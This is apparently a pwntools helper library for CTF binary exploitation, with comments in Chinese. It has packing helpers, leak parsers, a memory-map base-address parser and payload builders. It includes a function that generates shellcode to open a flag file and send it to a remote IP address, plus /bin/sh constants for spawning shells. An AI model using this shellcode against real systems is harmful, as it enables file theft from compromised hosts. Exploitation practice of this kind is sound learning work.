'''
    基础数据和操作
'''
from pwn import *
from struct import pack

# 打印地址
msg = lambda str, addr: print(str + " : " + hex(addr))

# binsh
BINSH = u64(b'/bin/sh\x00')
SH    = u64(b'$0\x00'.ljust(8, b'\x00'))

s64 = lambda x: struct.pack('<Q', x)
s32 = lambda x: struct.pack('<I', x)

p24 = lambda x: p64(x)[:3]
p40 = lambda x: p64(x)[:5]
p48 = lambda x: p64(x)[:6]
p56 = lambda x: p64(x)[:7]

u24 = lambda x: u64(x.ljust(8, b'\x00'))
u40 = lambda x: u64(x.ljust(8, b'\x00'))
u48 = lambda x: u64(x.ljust(8, b'\x00'))
u56 = lambda x: u64(x.ljust(8, b'\x00'))

# 获取泄露的地址
getaddr_fmt     = lambda p: int(str(p.recv(14), 'utf-8'), 16)
getaddr_byte    = lambda p: u64(p.recv(6).ljust(8, b'\x00'))

# 以字符串的形式满缓冲区发送数字
send_num = lambda p, num, buffer_size: p.send(bytes(str(num), 'utf-8').ljust(buffer_size, b'\x00'))

# 发送flag的shellcode
def sendflag_asm(ip, port = 9999, filename = './flag', file_fd = 3, socket_fd = 4, network = 'ipv4'):
	'''
		编写socket客户端的shellcode，发送flag
  
  		eg:
			p.send(asm(sendflag_asm('39.99.32.130')))
	'''	
	payload = ''
	payload += shellcraft.open(filename)
	payload += shellcraft.connect(ip, port, network)
	payload += shellcraft.sendfile(socket_fd, file_fd, 0, 0x100)
	return payload

def get_libc_version(libc):
    '''
        获取libc的版本号
        
        libc: pwnlib.elf.ELF对象
        
        返回值: 版本号整数，例如: 235表示2.35
    '''
    strings = libc.read(next(libc.search('GNU C Library ')), 0x100).split(b'\n', 1)[0]
    version_offset = strings.find(b'version')
    version = int(strings[version_offset+8:version_offset+12].replace(b'.', b''))
    return version

# 获取基地址
class AddrInfo:
    base = 0
    end = 0
    size = 0
    def __init__(self, StartAddr, EndAddr):
        self.base = StartAddr
        self.end = EndAddr
        self.size = EndAddr-StartAddr
        
    def ChangeEndAddr(self, EndAddr):
        self.end = EndAddr
        self.size = EndAddr-self.base
        
    def AddSize(self, Size):
        self.size += Size
        self.end += Size
    
    def __call__(self):
        return self.base
        
    def __int__(self):
        return self.base
    
    def __index__(self):
        return self.base
    
    def __str__(self):
        return f"base: {hex(self.base)}, end: {hex(self.end)}, size: {hex(self.size)}"
    def __repr__(self):
        return self.__str__()

def BaseAddr(p):
    """
        获取程序的基地址
        
        p: pwnlib的进程对象
        
        返回值: 字典，包含各个地址信息
        键值对格式: { 'elf': {base, end, size}, 'heap': {base, end, size}, ... }
        
        示例:
            addr = BaseAddr(p)
            
            print(addr['elf'].base)  # 打印elf的起始地址
            print(addr['libc'].base)  # 打印libc的起始地址
            print(addr['libc.so.6'].base)  # 打印libc的起始地址
            
            print(addr['elf'])  # 打印elf的地址信息
            print(addr['heap'])  # 打印heap的地址信息
            print(addr['libc'])  # 打印libc的地址信息
            print(addr['ld'])    # 打印ld的地址信息
            print(addr['stack']) # 打印stack的地址信息
            print(addr['vsyscall']) # 打印vsyscall的地址信息
            
        语法:
            addr = BaseAddr(p)
            libc_base = addr['libc']
            msg("libc基地址", libc_base.base)
            
    """
    base_addr = {}
    # 读取进程的maps文件
    maps_str = ''
    try:
        with open(f'/proc/{p.pid}/maps', 'r') as f:
            maps_str = f.read()
    except :
        log.error("无法读取进程的maps文件，请检查进程是否存在")
        return base_addr
    # 解析maps文件
    maps_str = [line.split() for line in maps_str.split('\n') if line.strip()]
    # 获取elf文件名
    elf_name = base_addr
    if len(maps_str) > 0 and len(maps_str[0]) > 5:
        elf_name = maps_str[0][5]
    else:
        log.error("无法获取elf文件名")
        return base_addr
    # 获取每一个段
    anonIndex = 0
    for i in maps_str:
        # 解析起始地址和结束地址
        addr = i[0].split('-')
        if len(addr) != 2:
            log.error(f"无法匹配地址: {i[0]}")
            continue
        start_addr = int(addr[0], 16)
        end_addr = int(addr[1], 16)
        addrinfo = AddrInfo(start_addr, end_addr)
        # 未知空间
        if len(i) < 6:
            base_addr[f'anon{anonIndex}'] = addrinfo
            anonIndex += 1
            continue
        # 正常获取内存
        else:
            # 检查是否为特殊空间
            if i[5] == elf_name:
                if base_addr.get('elf') is None:
                    base_addr['elf'] = addrinfo
                else:
                    base_addr['elf'].ChangeEndAddr(addrinfo.end)
            elif i[5] == '[heap]':
                if base_addr.get('heap') is not None:
                    log.error("heap地址重复")
                    return base_addr
                base_addr['heap'] = addrinfo
            elif i[5] == '[stack]':
                if base_addr.get('stack') is not None:
                    log.error("stack地址重复")
                    return base_addr
                base_addr['stack'] = addrinfo
            elif i[5] == '[vsyscall]':
                if base_addr.get('vsyscall') is not None:
                    log.error("vsyscall地址重复")
                    return None
                base_addr['vsyscall'] = addrinfo
            elif i[5] == '[vdso]':
                if base_addr.get('vdso') is not None:
                    log.error("vdso地址重复")
                    return base_addr
                base_addr['vdso'] = addrinfo
            elif i[5] == '[vvar]':
                if base_addr.get('vvar') is not None:
                    log.error("vvar地址重复")
                    return base_addr
                base_addr['vvar'] = addrinfo
            # 否则匹配so文件
            else:
                filename = os.path.basename(i[5])
                if base_addr.get(filename) is None:
                    base_addr[filename] = addrinfo
                else:
                    base_addr[filename].ChangeEndAddr(addrinfo.end)

                # libc和ld单独再创建字典
                if re.match(r'(libc.so.6|libc-[0-9]+\.[0-9]+\.so)', filename):
                    base_addr['libc'] = base_addr[filename]
                elif re.match(r'(ld.so|ld-linux-x86-64.so.2|ld-linux.so.2|ld-[0-9]+\.[0-9]+\.so)', filename):
                    base_addr['ld'] = base_addr[filename]
    return base_addr


# 设置payload
def set_bytes(payload, offset, byte):
    '''
        payload: 要写入的payload
        offset: 偏移
        byte: 要写入的字节
    '''
    if payload is None:
        payload = b''
    if len(payload) < offset+len(byte):
        payload = payload.ljust(offset+len(byte), b'\x00')
    return payload[:offset] + byte + payload[offset+len(byte):]

def set_value(payload, offset, value, fill = b'\x00'):
    '''
        payload: 要写入的payload
        offset: 偏移
        value: 要写入的值
        fill: 填充字符
    '''
    if payload is None:
        payload = b''
    if len(payload) < offset+8:
        payload = payload.ljust(offset+8, fill)
    return payload[:offset] + p64(value) + payload[offset+8:]

def set_value32(payload, offset, value, fill = b'\x00'):
    '''
        payload: 要写入的payload
        offset: 偏移
        value: 要写入的值
        fill: 填充字符
    '''
    if payload is None:
        payload = b''
    if len(payload) < offset+4:
        payload = payload.ljust(offset+4, fill)
    return payload[:offset] + p32(value) + payload[offset+4:]
